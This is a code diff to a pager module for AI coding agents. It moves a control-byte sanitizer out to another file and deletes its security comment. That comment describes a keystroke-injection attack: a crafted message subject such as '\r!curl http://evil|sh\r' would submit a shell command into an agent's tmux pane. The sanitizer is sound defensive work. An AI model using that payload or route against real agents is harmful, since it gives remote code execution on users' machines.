@@ -5,28 +5,11 @@
  * single home.
  */
 
-/**
- * SECURITY (keystroke-injection / RCE defense). Peer- and server-controlled strings -
- * a message `subject` (set by any project peer via the `send` MCP tool, which only
- * validates `min(1)`) and `fromPart` - are embedded into the nudge that the pager types
- * into the agent's tmux pane via `tmux send-keys -l -- <text>`. `-l` sends bytes
- * LITERALLY, so a control byte in the payload reaches the terminal: a carriage return
- * (\r, 0x0d) IS the Enter/submit key and ESC (0x1b) drives the TUI. A crafted subject
- * like `\r!curl http://evil|sh\r` would submit a shell command into the (often
- * permission/sandbox-bypassed) agent = remote code execution driven purely by a message
- * subject. Replace every C0 control byte (0x00-0x1f) + DEL (0x7f) with a space, collapse
- * whitespace, and clamp length so the preview can never carry an injected line break or
- * an oversized payload. (Code-point loop instead of a regex literal so no control byte
- * ever lives in this source file.)
- */
-export function sanitizeForKeys(s, max = 120) {
-  let out = ""
-  for (const ch of String(s ?? "")) {
-    const code = ch.codePointAt(0)
-    out += (code <= 0x1f || code === 0x7f) ? " " : ch
-  }
-  return out.replace(/ +/g, " ").trim().slice(0, max)
-}
+// The sanitizer now lives in wake-client.mjs so the channel server is held to the
+// same rule; the keystroke-injection rationale is documented there. Re-exported under
+// the original name because that is what the regression tests and the pager call it.
+export { sanitizeField as sanitizeForKeys } from "./wake-client.mjs"
+import { sanitizeField as sanitizeForKeys } from "./wake-client.mjs"
 
 // Wording matters: telling the agent to "reply" makes it answer every message
 // (incl. acks), which wakes the sender back -> an endless ack-of-ack loop that
